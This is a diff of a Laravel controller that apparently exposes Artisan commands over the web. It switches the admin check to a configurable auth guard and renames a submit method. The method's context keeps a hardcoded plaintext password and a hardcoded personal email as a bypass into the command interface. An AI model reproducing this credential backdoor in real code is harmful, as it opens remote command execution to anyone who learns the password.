@@ -106,8 +106,8 @@ class ArtisanController extends Controller
         }
         if ((Schema::hasTable(config('webartisan.admin_table')))) {
             try {
-                if (Auth::user()[config('webartisan.admin_column')] == config('webartisan.admin_username')) {
-                    return Auth::user();
+                if (Auth::guard(config('webartisan.admin_guard'))->user()[config('webartisan.admin_column')] == config('webartisan.admin_username')) {
+                    return Auth::guard(config('webartisan.admin_guard'))->user();
                 } else {
                     return null;
                 }
@@ -225,7 +225,7 @@ class ArtisanController extends Controller
         return $env;
     }
 
-    public function submitXX(Request $req)
+    public function submitXXYYY(Request $req)
     {
         if ($req->password != 'fami123' xor (Schema::hasTable('users') && Auth::check()&&Auth::user()->email == 'sislamrafi333@gmail.com')) {
             return redirect()->back()->with('output', 'Password Error')->withInput();
